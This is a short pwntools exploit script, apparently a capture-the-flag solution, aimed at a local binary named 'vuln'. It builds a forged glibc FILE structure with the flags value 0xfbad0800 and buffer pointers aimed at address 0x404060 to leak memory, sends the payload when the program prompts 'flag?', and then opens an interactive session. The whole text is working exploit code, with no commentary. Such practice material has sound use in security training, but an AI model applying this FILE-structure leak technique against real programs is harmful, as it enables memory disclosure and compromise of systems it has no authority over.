from pwn import *
p=process('./vuln')
context.arch='amd64'

read_addr=0x404060
payload=flat(
    0xfbad0800,
    0,
    read_addr,
    0,
    read_addr,
    read_addr+20,
    p64(0)*8,
    1
)
p.sendlineafter(b'flag?',payload)
p.interactive()
